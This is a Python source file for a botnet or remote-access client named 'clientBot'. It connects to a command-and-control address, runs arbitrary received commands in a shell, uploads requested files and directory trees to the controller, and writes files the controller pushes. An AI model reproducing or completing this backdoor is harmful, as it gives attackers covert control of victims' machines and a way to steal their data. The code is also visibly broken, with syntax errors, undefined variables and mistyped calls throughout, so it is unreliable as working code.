import socket, sys, os, argparse

class clientBot(threading.Thread):

    def __init__(self, cncIP, port):
        self.socket = socket.socket()
        self.socket.connect((cncIP, port))
        self.recieveCommands()
        
    def recieveCommands(self):
        while command != "wq":
            command = self.recieveData()
            if command[0] is "@"
                if command[1:8] == "recieve":
                    if command[9:12] == "dir":
                        self.sendData("OK")
                        self.sendData("-1")
                        self.recieveDir(command[13:])
                        
                    elif command[9:14] == "files":
                        self.sendData("OK")
                        fileNames = command[15:]
                        names = ",".split(fileNames)
                        self.recieveFiles(names)
                                             )
                    elif command[9:13] == "file":
                        self.sendData("OK")
                        self.receiveData(command[14:])
                    else
                        self.sendData("Command Not Recognized")
                        continue
                    
                elif command[1:7] is "return":
                    if command[8:11] is "dir":
                        self.sendData("OK")
                        self.returnDir(command[12:])

                    elif command[8:13] is "files":
                        self.sendData("OK")
                        fileNames = command[14:]
                        names = ",".split(fileNames)
                        self.returnFiles(names)
                    
                    elif command[8:12] is "file":
                        self.sendData("OK")
                        self.returnFile(command[13:])

                    else
                        self.sendData("Command Not Recognized")
                        continue

                elif command[1:3] == 'cd':
                    directory = command [4:]
                    os.chdir(directory)

            else:
                cmd = subprocess.Popen(command, shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
                cmd = (cmd.stdout.read() + cmd.stderr.read()).decode('utf-8')
                print(str(cmd))

                self.sendData(results)
            
            self.sendData("\n" + os.getcwd() + ">>")

    def isError(data):
        if "$ERROR$" in data[-6:]:
            return True
        else:
            return False

    def sendData(self, data, binary= False, size= None):
        if size is None:
            size = str(sys.getsize(data)).zfill(1024)
        try:
            self.socket.send(str(size).encode('utf-8'))
            if not binary:
                self.socket.send((str(0).zfill(1024)).encode('utf-8'))
                self.socket.send(data.encode('utf-8'))
            else:
                self.socket.send((str(1).zfill(1024)).encode('utf-8'))
                self.socket.send(data)
            return True
        
        except:
            self.socket.send("$ERROR$".zfill(int(size)))
            return False

    def recieveData(self, fileName = None):
        size = self.socket.recv(1024).decode('utf-8')
        binary = self.socket.recv(1024).decode('utf-8')
        if binary == "1":
            binary = True
        else:
            binary = False

        data = self.socket.recv(int(size))
        if isError(size) or (isError(binary) or isError(data)):
            break
        
        if fileName is not None:
            try:
                if "C:" not in fileName:
                    fileName = os.path.join(os.getcwd(), fileName)

                if int(binary) == 1:
                    file = open(fileName, 'ab')
                else:
                    file = open(fileName, 'a')
                    data = data.decode('utf-8')
                if data[-7:] == "$ERROR$":
                    pass
                else:
                    file.write(data)

            except:
                pass
        
            file.close()
    `
        return data

    def recieveFiles(self, fileNames):
        for file in fileNames:
            self.recieveData(file)
    
    def recieveDir(self, path):
        if not os.path.exists(path) or not os.path.isdir(path):
            if "C:" not in path:
                os.path.join(os.getcwd(), path)

            os.makedirs(path)
        while True:
            fileName = self.recieveData()
            if fileName == "__DONE__":
                break
            
            elif fileName[0:12] == "SENDING FILE:":
                filePath = os.path.join(path, fileName[14:])
                self.recieveData(filePath)
                
            elif fileName[0:14] == "NEW DIRECTORY:":
                newDirec = fileName[16:]
                newDirecPath = os.path.join(path, newDirec)
                self.recieveDir(newDirecPath)
                    
            
    def returnFile(self, path):
        if not 'C:' in path:
            path = os.path.join(path, os.getcwd)
            
        with open(path, 'rb') as file:
            data = file.read()
            self.sendData(data, True)
            
            file.close()

    def returnFiles(self.fileNames):
        for name in fileNames:
            self.returnFile(name)
    
    def returnDirectory(self, directory, clearance = 1, topLevel = True):
        if topLevel:
            clearence = self.recieveData()
            clearence = int(clearance)

        directories = []
        if 'C:' not in directory:
            directory = os.path.join(os.getpath(cwd), directory)
        for file in os.listdir(directory):
           path = os.path.join(directory, file) 
            if os.path.isfile(path):
                self.sendData("SENDING FILE: " + path)
                self.returnFile(path)
            elif os.path.isdir(path) && clearance != 0:
                directories.append(path)

            else:
                pass
            
        if clearence != 0:
            for direc in directories:
                path = os.path.join(direc, directory)
                self.socket.send("NEW DIRECTORY: " + direc)
                self.returnDirectory(path, clearance - 1, False)

        self.sendData('__DONE__')
            
if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add-argument('-ho', '--host', help= 'The host IP the bot will connect to', type= str)
    parser.add_argument('p', '--port', help= 'The host port the socket will connect to', type= int)

    args = parser.parse_args()

    if args.host:
        host  = args.host
    else:
        host = "127.0.0.1"

    if args.port:
        port = args.port
    else:
        port = 5000

    client = clientBot(host, port)
    client.start()
    client.join()
